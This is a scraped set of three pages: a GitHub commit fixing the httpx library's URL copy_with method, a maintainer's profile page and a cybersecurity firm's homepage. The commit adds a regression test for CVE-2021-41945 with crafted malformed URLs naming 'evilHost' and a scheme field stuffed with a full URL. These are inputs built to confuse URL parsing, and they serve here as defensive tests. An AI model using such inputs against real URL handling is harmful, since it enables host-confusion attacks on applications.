[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fcommit%2Fe9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=encode%2Fhttpx)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[encode](/encode)
/
**[httpx](/encode/httpx)**
Public

* [Notifications](/login?return_to=%2Fencode%2Fhttpx) You must be signed in to change notification settings
* [Fork
  856](/login?return_to=%2Fencode%2Fhttpx)
* [Star
   13.6k](/login?return_to=%2Fencode%2Fhttpx)

* [Code](/encode/httpx)
* [Issues
  45](/encode/httpx/issues)
* [Pull requests
  34](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

Additional navigation options

* [Code](/encode/httpx)
* [Issues](/encode/httpx/issues)
* [Pull requests](/encode/httpx/pulls)
* [Discussions](/encode/httpx/discussions)
* [Actions](/encode/httpx/actions)
* [Security](/encode/httpx/security)
* [Insights](/encode/httpx/pulse)

## Commit

[Permalink](/encode/httpx/commit/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Patch `copy_with` ([#2185](https://github.com/encode/httpx/pull/2185))

[Browse files](/encode/httpx/tree/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c)
Browse the repository at this point in the history

```
* Patch `copy_with`

* Add a new test for `copy_with`
```

* Loading branch information

[![@lebr0nli](https://avatars.githubusercontent.com/u/61896187?s=40&v=4)](/lebr0nli)

[lebr0nli](/encode/httpx/commits?author=lebr0nli "View all commits by lebr0nli")
authored
May 3, 2022

1 parent
[b07fe7b](/encode/httpx/commit/b07fe7b0745e62be5ef9bce1bee9e7d7a8878552)

commit e9b0c85

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**54 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* httpx

  + httpx/\_urls.py
    [\_urls.py](#diff-f1eb4e8fbdbce3bb7dcc3ecb662f690f9443599de8b172513ddb65de6b1d7c73)
* tests/models

  + tests/models/test\_url.py
    [test\_url.py](#diff-e22e5624ca4e994155aa44e1b25f7812b286a8bbbeabdcd6490073ad2f3927dc)

## There are no files selected for viewing

6 changes: 5 additions & 1 deletion

6
[httpx/\_urls.py](#diff-f1eb4e8fbdbce3bb7dcc3ecb662f690f9443599de8b172513ddb65de6b1d7c73 "httpx/_urls.py")

Show comments

[View file](/encode/httpx/blob/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c/httpx/_urls.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -484,7 +484,11 @@ def copy\_with(self, \*\*kwargs: typing.Any) -> "URL": |
|  |  | # \\_/ \\_\_\_\_\_\_\_\_\_\_\_\_\_\_/\\_\_\_\_\_\_\_\_\_/ \\_\_\_\_\_\_\_\_\_/ \\_\_/ |
|  |  | # | | | | | |
|  |  | # scheme authority path query fragment |
|  |  | return URL(self.\_uri\_reference.copy\_with(\*\*kwargs).unsplit()) |
|  |  | new\_url = URL(self) |
|  |  | new\_url.\_uri\_reference = self.\_uri\_reference.copy\_with(\*\*kwargs) |
|  |  | if new\_url.is\_absolute\_url: |
|  |  | new\_url.\_uri\_reference = new\_url.\_uri\_reference.normalize() |
|  |  | return URL(new\_url) |
|  |  |  |
|  |  | def copy\_set\_param(self, key: str, value: typing.Any = None) -> "URL": |
|  |  | return self.copy\_with(params=self.params.set(key, value)) |
| Expand Down | |  |

49 changes: 49 additions & 0 deletions

49
[tests/models/test\_url.py](#diff-e22e5624ca4e994155aa44e1b25f7812b286a8bbbeabdcd6490073ad2f3927dc "tests/models/test_url.py")

Show comments

[View file](/encode/httpx/blob/e9b0c85dd4f4e4469c57c4b38e5101fd12081b5c/tests/models/test_url.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -308,6 +308,55 @@ def test\_url\_copywith\_raw\_path(): |
|  |  | assert url.raw\_path == b"/some/path?a=123" |
|  |  |  |
|  |  |  |
|  |  | def test\_url\_copywith\_security(): |
|  |  | """ |
|  |  | Prevent unexpected changes on URL after calling copy\_with (CVE-2021-41945) |
|  |  | """ |
|  |  | url = httpx.URL("https://u:p@[invalid!]//evilHost/path?t=w#tw") |
|  |  | original\_scheme = url.scheme |
|  |  | original\_userinfo = url.userinfo |
|  |  | original\_netloc = url.netloc |
|  |  | original\_raw\_path = url.raw\_path |
|  |  | original\_query = url.query |
|  |  | original\_fragment = url.fragment |
|  |  | url = url.copy\_with() |
|  |  | assert url.scheme == original\_scheme |
|  |  | assert url.userinfo == original\_userinfo |
|  |  | assert url.netloc == original\_netloc |
|  |  | assert url.raw\_path == original\_raw\_path |
|  |  | assert url.query == original\_query |
|  |  | assert url.fragment == original\_fragment |
|  |  |  |
|  |  | url = httpx.URL("https://u:p@[invalid!]//evilHost/path?t=w#tw") |
|  |  | original\_scheme = url.scheme |
|  |  | original\_netloc = url.netloc |
|  |  | original\_raw\_path = url.raw\_path |
|  |  | original\_query = url.query |
|  |  | original\_fragment = url.fragment |
|  |  | url = url.copy\_with(userinfo=b"") |
|  |  | assert url.scheme == original\_scheme |
|  |  | assert url.userinfo == b"" |
|  |  | assert url.netloc == original\_netloc |
|  |  | assert url.raw\_path == original\_raw\_path |
|  |  | assert url.query == original\_query |
|  |  | assert url.fragment == original\_fragment |
|  |  |  |
|  |  | url = httpx.URL("https://example.com/path?t=w#tw") |
|  |  | original\_userinfo = url.userinfo |
|  |  | original\_netloc = url.netloc |
|  |  | original\_raw\_path = url.raw\_path |
|  |  | original\_query = url.query |
|  |  | original\_fragment = url.fragment |
|  |  | bad = "https://xxxx:xxxx@xxxxxxx/xxxxx/xxx?x=x#xxxxx" |
|  |  | url = url.copy\_with(scheme=bad) |
|  |  | assert url.scheme == bad |
|  |  | assert url.userinfo == original\_userinfo |
|  |  | assert url.netloc == original\_netloc |
|  |  | assert url.raw\_path == original\_raw\_path |
|  |  | assert url.query == original\_query |
|  |  | assert url.fragment == original\_fragment |
|  |  |  |
|  |  |  |
|  |  | def test\_url\_invalid(): |
|  |  | with pytest.raises(httpx.InvalidURL): |
|  |  | httpx.URL("https://😇/") |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e9b0c85`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fencode%2Fhttpx%2Fcommit%2Fe9b0c85dd4f4e4469c57c4b38e5101fd12081b5c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f43c2e30_20250115_111923.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflorimondmanca)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflorimondmanca)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@florimondmanca](https://avatars.githubusercontent.com/u/15911462?s=64&v=4)

**florimondmanca**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fflorimondmanca)

[Overview](/florimondmanca)
[Repositories
107](/florimondmanca?tab=repositories)
[Projects
0](/florimondmanca?tab=projects)
[Packages
0](/florimondmanca?tab=packages)
[Stars
1.3k](/florimondmanca?tab=stars)

More

* [Overview](/florimondmanca)
* [Repositories](/florimondmanca?tab=repositories)
* [Projects](/florimondmanca?tab=projects)
* [Packages](/florimondmanca?tab=packages)
* [Stars](/florimondmanca?tab=stars)

![@florimondmanca](https://avatars.githubusercontent.com/u/15911462?s=64&v=4)

**florimondmanca**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fflorimondmanca)

[![View florimondmanca's full-sized avatar](https://avatars.githubusercontent.com/u/15911462?v=4)](https://avatars.githubusercontent.com/u/15911462?v=4)
🌱

# Florimond Manca florimondmanca

🌱

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fflorimondmanca)

 [Sponsor](/sponsors/florimondmanca)

Open source, Python, Web dev, digital ecodesign
[798
followers](https://github.com/florimondmanca?tab=followers) · [55
following](https://github.com/florimondmanca?tab=following)

* [@fairnesscoop](https://github.com/fairnesscoop)
* France
* <https://florimond.dev>
* Mastodon

  [@florimond@fosstodon.org](https://fosstodon.org/%40florimond)
* <https://fairness.coop>

## Sponsors

[![@mxrch](https://avatars.githubusercontent.com/u/17338428?s=70&v=4)](/mxrch)

## Organizations

[![@encode](https://avatars.githubusercontent.com/u/19159390?s=64&v=4)](/encode) [![@bocadilloproject](https://avatars.githubusercontent.com/u/45132557?s=64&v=4)](/bocadilloproject)

Block or Report

# Block or report florimondmanca

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=florimondmanca+%28user%29)

[Overview](/florimondmanca)
[Repositories
107](/florimondmanca?tab=repositories)
[Projects
0](/florimondmanca?tab=projects)
[Packages
0](/florimondmanca?tab=packages)
[Stars
1.3k](/florimondmanca?tab=stars)

More

* [Overview](/florimondmanca)
* [Repositories](/florimondmanca?tab=repositories)
* [Projects](/florimondmanca?tab=projects)
* [Packages](/florimondmanca?tab=packages)
* [Stars](/florimondmanca?tab=stars)

## Pinned Loading

1. [awesome-asgi](/florimondmanca/awesome-asgi) awesome-asgi Public

   A curated list of awesome ASGI servers, frameworks, apps, libraries, and other resources

   Python

   [1.6k](/florimondmanca/awesome-asgi/stargazers)
   [100](/florimondmanca/awesome-asgi/forks)
2. [ASGI Packages](https://gist.github.com/florimondmanca/b4dda058dcc2937494caa61cfc759319) ASGI Packages
   1
   ```
   A list of ASGI-related Python packages I maintain:
   ```

   2
   3
   ```
   - [arel](https://github.com/florimondmanca/arel): Browser hot reload for ASGI apps.
   ```

   4
   ```
   - [asgi-htmx](https://github.com/florimondmanca/asgi-htmx): HTMX integration for ASGI applications.
   ```

   5
   ```
   - [asgi-lifespan](https://github.com/florimondmanca/asgi-lifespan): ASGI lifespan utilities.
   ```
3. [encode/httpx](/encode/httpx) encode/httpx Public

   A next generation HTTP client for Python. 🦋

   Python

   [13.6k](/encode/httpx/stargazers)
   [856](/encode/httpx/forks)
4. [djangorestframework-api-key](/florimondmanca/djangorestframework-api-key) djangorestframework-api-key Public

   🔐 API key permissions for Django REST Framework

   Python

   [684](/florimondmanca/djangorestframework-api-key/stargazers)
   [103](/florimondmanca/djangorestframework-api-key/forks)
5. [aiometer](/florimondmanca/aiometer) aiometer Public

   A Python concurrency scheduling library, compatible with asyncio and trio.

   Python

   [382](/florimondmanca/aiometer/stargazers)
   [12](/florimondmanca/aiometer/forks)
6. [asgi-lifespan](/florimondmanca/asgi-lifespan) asgi-lifespan Public

   Programmatic startup/shutdown of ASGI apps.

   Python

   [221](/florimondmanca/asgi-lifespan/stargazers)
   [13](/florimondmanca/asgi-lifespan/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from encode.com_93175ced_20250114_181218.html ===
   [![logo](data:image/gif;base64...)![logo](data:image/gif;base64...)![logo](https://www.obrela.com/wp-content/uploads/2023/05/ob-logo.svg)](https://www.obrela.com/)  Enter search term

* [Platform](https://www.obrela.com/swordfish-platform/)
  + column
    - [Swordfish for MDR](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/)
      * [CyberOps](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/swordfish-cyberops/)
      * [SOCStreams](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/socstreams/)
      * [SRM](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/srm/)
      * [EMC](https://www.obrela.com/swordfish-platform/swordfish-for-mdr/emc/)
    - [Book a Demo](https://www.obrela.com/contact-us/)
  + column
    - [Swordfish for MRC](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/)
      * [Privacy Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/privacy-management-module/)
      * [Policy Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-policy-management-module/)
      * [Compliance Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-compliance-management-module/)
      * [Supply Chain Security Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-supply-chain-security-module/)
      * [Exposure Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-exposure-management-module/)
      * [Cyber Risk Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-cyber-risk-management-module/)
      * [Incident Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-incident-management-module/)
      * [Cyber Resilience Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-cyber-resilience-management-module/)
      * [Digital Universe Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-digital-universe-management-module/)
      * [Risk Analytics Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/swordfish-risk-analytics-module/)
      * [Service Management Module](https://www.obrela.com/swordfish-platform/swordfish-for-mrc/service-management-module/)
  + [The ERP for CyberChoose predictability over uncertainty using a single platform![](data:image/gif;base64...)Learn More](/swordfish-platform/)
* [Solutions](/solutions/)
  + column
    - [Managed Detection & Response](/solutions/mdr/)
      * [MDR Core](/solutions/mdr/mdr-core/)
      * [MDR INFRA](/solutions/mdr/mdr-infra/)
      * [MDR Cloud](/solutions/mdr/mdr-cloud/)
      * [MDR for OT](/solutions/mdr/mdr-ot/)
      * [MDR for Vessels](/solutions/mdr/mdr-for-vessels/)
      * [MDR for Brand](/solutions/mdr/mdr-for-brand/)
    - [Managed Risk & Controls](https://www.obrela.com/solutions/mrc/)
      * [MRC for Privacy](https://www.obrela.com/solutions/mrc/mrc-for-privacy/)
      * [MRC for Policy](https://www.obrela.com/solutions/mrc/mrc-for-policy/)
      * [MRC for Compliance](https://www.obrela.com/solutions/mrc/mrc-for-compliance/)
      * [MRC for Supply Chain](https://www.obrela.com/solutions/mrc/mrc-for-supply-chain/)
      * [MRC for Exposure](https://www.obrela.com/solutions/mrc/mrc-for-exposure/)
      * [MRC for Cyber Risk](https://www.obrela.com/solutions/mrc/mrc-for-cyber-risk/)
      * [MRC for Cyber Resilience](https://www.obrela.com/solutions/mrc/mrc-for-cyber-resilience/)
  + column
    - [Managed Cyber Defense](/solutions/mcd/)
    - [Advisory Services](/solutions/advisory-services/)
      * [Risk Assessment](https://www.obrela.com/solutions/advisory-services/risk-assessment/)
      * [Compliance Assessment](https://www.obrela.com/solutions/advisory-services/compliance-assessment/)
      * [SOC Capability & Maturity Assessment](https://www.obrela.com/solutions/advisory-services/soc-capability-maturity-assessment/)
      * [Red Teaming](https://www.obrela.com/why-obrela/obrela-labs/red-teaming/)
      * [Penetration Testing](https://www.obrela.com/why-obrela/obrela-labs/penetration-testing/)
      * [Vulnerability Assessment](https://www.obrela.com/solutions/advisory-services/vulnerability-assessment/)
  + [Manage Risk Not Only ThreatsRemove complexity, and get instant visibility![](data:image/gif;base64...)Learn More](/solutions/)
* [Why Obrela](/why-obrela/)
  + column
    - [MDR Service Capabilities](/why-obrela/mdr-service-capabilities/)
      * [SOCaaS](/why-obrela/mdr-service-capabilities/socaas/)
      * [Blue Team Support](/why-obrela/mdr-service-capabilities/blue-team-support/)
      * [Threat Hunting](/why-obrela/mdr-service-capabilities/threat-hunting/)
      * [Proactive Incident Response](/why-obrela/mdr-service-capabilities/proactive-incident-response/)
      * [Platform Engineering & Support](/why-obrela/mrc-service-capabilities/platform-engineering-support/)
      * [Advanced CSIRT](/why-obrela/mdr-service-capabilities/advanced-csirt/)
    - [MRC Service Capabilities](/why-obrela/mrc-service-capabilities/)
      * [Orchestration](https://www.obrela.com/why-obrela/mrc-service-capabilities/orchestration/)
      * [Content Management](https://www.obrela.com/why-obrela/mrc-service-capabilities/content-management/)
      * [Risk Monitoring & Hunting](https://www.obrela.com/why-obrela/mrc-service-capabilities/mrc-risk-monitoring-hunting/)
      * [Platform Engineering & Support](https://www.obrela.com/why-obrela/mrc-service-capabilities/platform-engineering-support/)
      * [Service Management](https://www.obrela.com/why-obrela/mrc-service-capabilities/customer-service-management/)
  + column
    - [Industries](/why-obrela/industries/)
      * [Manufacturing](/why-obrela/industries/manufacturing/)
      * [Shipping](https://www.obrela.com/why-obrela/industries/shipping/)
      * [Banking & Finance](/why-obrela/industries/banking-finance/)
      * [Energy & Utilities](https://www.obrela.com/why-obrela/industries/cybersecurity-for-the-energy-utilities-industry/)
      * [Healthcare](/why-obrela/industries/healthcare/)
      * [Telecommunications](/why-obrela/industries/telecommunications/)
      * [Oil & Gas](https://www.obrela.com/why-obrela/industries/oil-gas/)
      * [Retail](https://www.obrela.com/why-obrela/industries/retail/)
    - [Accreditations](https://www.obrela.com/why-obrela/accreditations/)
    - [Obrela Labs](https://www.obrela.com/why-obrela/obrela-labs/)
  + [The elite team that predicts threatsKnowledge | Innovation Building Resilient Cyberdefenses![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/ObrelaLabs-white.png)Learn More](/why-obrela/obrela-labs/)
* [Company](https://www.obrela.com/company/)
  + column
    - [About Obrela](/company/about/)
    - [Our Team](/company/our-team/)
    - [Our Values](https://www.obrela.com/company/values/)
  + column
    - [Events](https://www.obrela.com/company/events/)
    - [Partners](/company/partners/)
    - [Careers](/company/careers/)
  + [Looking for your next opportunity in an innovative companyJoin Our Team![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/12/Obrela_Teamf.jpg)Apply Now](https://www.obrela.com/company/careers/)
* [Resources](/resources/)
  + column
    - [Blog](/resources/blog/)
    - [News](/resources/news/)
    - [Brochures](/resources/brochures/)
    - [Datasheets](/resources/datasheets/)
    - [Case Studies](https://www.obrela.com/resources/case-studies/)
  + column
    - [Labs Research](/resources/labs-insights/)
    - [Advisories](/resources/advisory/)
    - [Videos](https://www.obrela.com/resources/videos/)
    - [Whitepapers](https://www.obrela.com/resources/whitepapers/)
    - [Reports](https://www.obrela.com/resources/reports/)
  + [Continuous Innovation and ExcellenceObrela featured in the latest Gartner MDR report, again![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/07/OBRELA-GARTNER-MARKET-GUIDE-2024-social.jpg)Read More](https://www.obrela.com/report/obrela-in-the-2024-gartner-market-guide-for-mdr/)

 [Incident Response](https://www.obrela.com/emergency-incident-response/) [Contact Us](https://www.obrela.com/contact-us/)

* [English](https://www.obrela.com/)
* [Deutsch (German)](https://www.obrela.com/de/)

* [Incident Response](https://www.obrela.com/emergency-incident-response/)
* [Contact Us](https://www.obrela.com/contact-us/)
* + [English](https://www.obrela.com/)
  + [Deutsch (German)](https://www.obrela.com/de/)
     ![Banner Image](https://www.obrela.com/wp-content/uploads/2023/11/Homepage-Hero-min-1.jpg)
# BE READY. BE RESILIENT. BE UNSTOPPABLE.

Obrela combines business focused risk management with threat detection to deliver real time cyber defense that’s ready for everything that comes next.

Obrela. Security Over Everything.

 [Discover Our Platform](https://www.obrela.com/swordfish-platform/) [Watch Video](https://www.youtube.com/watch?v=k4yeDXfmhrc)

* #### SWORDFISH PLATFORM

  With SWORDFISH®, a risk management and managed threat detection and response platform, we deliver predictability over uncertainty, allowing you to orchestrate and control all aspects of cybersecurity. By centralizing security data, we deliver visibility over your entire digital universe.

  [Learn More](https://www.obrela.com/swordfish-platform/) ![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/backlogo.png)
* #### SOLUTIONS

  Obrela offers a wider range of services for your cybersecurity protection ranging from MDR (Managed Threat Detection and Response) ΜRC (Managed Risk and Controls ), MCD (Managed Cyber Defense) and AS (Advisory Services).

  [Learn More](https://www.obrela.com/solutions/) ![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/backlogo.png)
* #### INDUSTRIES

  We provide an umbrella of cybersecurity expertise that spans across a wide range of industries, offering in-depth insight on various domains, capitalizing on our distinctive number of implementations and experience across multiple industry sectors.

  [Learn More](/why-obrela/industries/) ![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](data:image/gif;base64...)![Back logo](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/backlogo.png)
 ![logo-outline](data:image/gif;base64...)![logo-outline](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo-outline.png)">

SECURITY OVER

## EVERYTHING

Protect every aspect of your business no matter how much it grows or how complex it gets.

 [Contact Us](https://www.obrela.com/contact-us/)
## WHO WE ARE

Obrela is a global provider of cyber security services. Obrela provides security analytics and risk management services to identify, analyze, predict and prevent highly sophisticated security threats in real time.

[Why Obrela](https://www.obrela.com/why-obrela/)

* [![Thumbnail Image](data:image/gif;base64...)](https://www.youtube.com/watch?v=929kSth8_6A)

* Security over your digital universe
 ![shape](data:image/gif;base64...)![shape](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/shape.png) ![Gradient Shade](data:image/gif;base64...)![Gradient Shade](data:image/gif;base64...)![Gradient Shade](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/gradient-shade.png) ![Logo Outline](data:image/gif;base64...)![Logo Outline](data:image/gif;base64...)![Logo Outline](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo-outline.png)
## OBRELA IN THE GARTNER MDR REPORT, AGAIN

Access Gartner's MDR Market Guide and learn more about the latest trends in MDR landscape.

 [Download](https://www.obrela.com/report/obrela-is-recognised-in-the-2023-gartner-market-guide-for-mdr-services/)
## OBRELA IN NUMBERS

The below key operational metrics (2023) provide an overview of Obrela’s ability to detect, analyze, and respond to cyber threats while offering insights into the company’s growth and milestones.

* 15PBs

  Data processed
* 500K

  Devices monitored
* 12.3'

  Response time
* 1.6M

  Triaged Alerts
* 99.9%

  Availability SLA
* 20+

  Countries
* 250+

  Customers
* 250+

  Workforce

 ![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo-shape.svg)
## TESTIMONIALS

 ![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/themes/obrela/html/app/assets/img/logo-shape.svg)

* ## Banking & Finance Industry

  Case Study
* ## Retail Industry

  Case Study
* ## Telecom Industry

  Case Study

* “Obrela services and solutions enable financial institutions to manage information risk through an enterprise-wide, cyber security risk management, compliance and governance program, so as to more effectively address the protection of critical assets, infrastructure and data."

  Case Study ,Banking & Finance Industry

  [Read More](https://www.obrela.com/case-study/banking-finance-case-study/)
* “Obrela Services consist of a comprehensive suite of Cyber Security and Compliance solutions for Retail and Consumer companies to help them secure their infrastructure, their data and their clients against an emerging threat landscape and maintain compliance with laws and regulations."

  Case Study,Retail Industry

  [Read More](https://www.obrela.com/case-study/retail-case-study/)
* “Obrela's Services combine collective intelligence practices and methods with leading edge security analytics and sophisticated risk management technology to identify, analyze, predict and prevent cyber-security threats in real time."

  Case Study ,Telecom Industry

  [Read More](https://www.obrela.com/case-study/telecommunications-case-study/)
## ACCREDITATIONS

Holding a series of prestigious Certifications and Awards, Obrela, leverages the expertise and dedication of its elite workforce to complement algorithmic processing superiority with human-driven situational awareness to deliver Security Over Everything.

[See All Accreditations](/why-obrela/accreditations/)

* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/11/GARTNER-MDR-2024-larger-002.png) ![]() [OBRELA IN GARTNER®](https://www.obrela.com/news/obrela-acknowledged-again-in-the-2024-gartner-market-guide-for-mdr/)
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/GARTNER-MDR-2023-larger-3.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/MDR-VENDOR-2021-large.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/MSS-Gartner-2020_mss-w-larger.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/ISO22301-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/ISO-IEK-27001-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/11/ISO2006-BW.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/08/CyberDefenseMagazinemdr_service-w.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2023/10/SECURETRUST-2.png) ![]()
* ![](data:image/gif;base64...)![](https://www.obrela.com/wp-content/uploads/2024/01/MISA_logo2.png) ![]()
